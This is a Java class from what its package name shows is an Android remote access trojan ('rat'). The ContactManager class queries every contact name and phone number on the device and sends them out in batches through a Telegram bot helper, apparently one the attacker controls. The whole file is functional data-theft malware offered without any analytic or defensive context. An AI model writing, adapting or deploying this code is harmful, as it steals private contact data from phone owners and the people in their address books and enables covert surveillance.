package com.enterprise.rat.commands;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import com.enterprise.rat.utils.TelegramApi;

public class ContactManager {
    private Context context;

    public ContactManager(Context context) { this.context = context; }

    public void sendContacts() {
        StringBuilder sb = new StringBuilder("<b>👤 Contact List:</b>\n\n");
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append("<b>").append(name).append(":</b> <code>").append(number).append("</code>\n");
                if (sb.length() > 3500) { // Telegram message limit safety
                    TelegramApi.sendMessage(sb.toString());
                    sb.setLength(0);
                }
            }
            cursor.close();
            if (sb.length() > 0) TelegramApi.sendMessage(sb.toString());
        }
    }
}
